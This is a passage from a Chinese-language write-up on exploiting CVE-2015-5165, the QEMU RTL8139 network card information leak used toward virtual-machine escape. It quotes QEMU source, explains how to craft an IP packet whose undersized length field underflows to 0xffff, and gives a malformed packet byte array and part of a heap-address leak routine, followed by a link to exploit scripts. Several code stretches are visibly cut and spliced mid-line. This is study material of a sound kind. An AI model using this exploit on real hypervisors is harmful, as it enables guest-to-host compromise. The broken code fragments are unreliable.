            ++txcount;
        }
        ...
    }
再看`rtl8139_cplus_transmit`的引用：
    static void rtl8139_io_writeb(void *opaque, uint8_t addr, uint32_t val)
    {
      ...
        switch (addr)
        {
            ...
            case TxPoll:
                DPRINTF("C+ TxPoll write(b) val=0x%02x\n", val);
                if (val & (1   mtu 1500
            ether 52:54:00:12:34:57  txqueuelen 1000  (Ethernet)
            RX packets 0  bytes 0 (0.0 B)
            RX errors 0  dropped 0  overruns 0  frame 0
            TX packets 0  bytes 0 (0.0 B)
            TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
还需要将类型设置成`0x0800`即IP包。
下一层数据包为IP数据包格式，格式如下：
在这个包中需要构造的就是16位总长度了，`#define IP_HEADER_LENGTH(ip) (((ip->ip_ver_len)&0xf) ip_len`长度为`19(0x13)`，实现了漏洞构造`ip_data_len`为`0xffff`。
    hlen = IP_HEADER_LENGTH(ip);
    ip_protocol = ip->ip_p;
    ip_data_len = be16_to_cpu(ip->ip_len) - hlen;
最后是一个tcp数据包，tcp数据包没有什么需要特别构造的，正常构造即可。
最后构造出来的`packet`数据如下：
    /* malformed ip packet with corrupted header size */
    uint8_t malformed_eth_packet[]={
        0x52, 0x54, 0x00, 0x12, 0x34, 0x57, 0x52, 0x54, 0x00, 0x12, 0x34, 0x57,  // 6 bytes dst mac addr, 6 bytes src mac addr
        0x08, 0x00, 0x45, 0x00, 0x00, 0x13, 0xde, 0xad, 0x40, 0x00, 0x40, 0x06,  // 2 bytes type, 0x0800 is ip, one byte (4 bits ip version, 4 bits ip header len), one bytes TOS, 2 bytes total len(0x0013, 0x13-0x5  0xd5c000) {
                    for(j = 0; j < sizeof(target_offset)/sizeof(int64_t); j++) {
                        if(((addr -target_offset[j])&0xfff) == 0) {
                            heap_base = addr - target_offset[j];
                            break;
                        }
                    }
                }
            }
            if(heap_base != 0)
                break;
        }
        return heap_base;
    }
## 小结
真实的漏洞还是比之前ctf题目稍微复杂一些，调起来还是有收获。
相关文件以及脚本[链接](https://github.com/ray-cp/vm-escape/tree/master/qemu-escape/cve-2015-5165_and_cve-2015-7504)
## 参考链接
  1. [虚拟机逃逸——QEMU的案例分析（一）](https://bbs.pediy.com/thread-217997.htm)
  2. [虚拟机逃逸——QEMU的案例分析（二）](https://bbs.pediy.com/thread-217999.htm)
  3. [前往黑暗之门！Debugee in QEMU](https://www.anquanke.com/post/id/86636)
  4. [VM escape–QEMU Case Study](http://www.phrack.org/papers/vm-escape-qemu-case-study.html)
  5. [QEMU escape: Part 3 Information Leakage (CVE-2015-5165)](https://dangokyo.me/2018/03/08/qemu-escape-part-3-information-leakage-cve-2015-5165/)
  6. [Setup: Ubuntu host, QEMU vm, x86-64 kernel](https://github.com/google/syzkaller/blob/master/docs/linux/setup_ubuntu-host_qemu-vm_x86-64-kernel.md)
* * *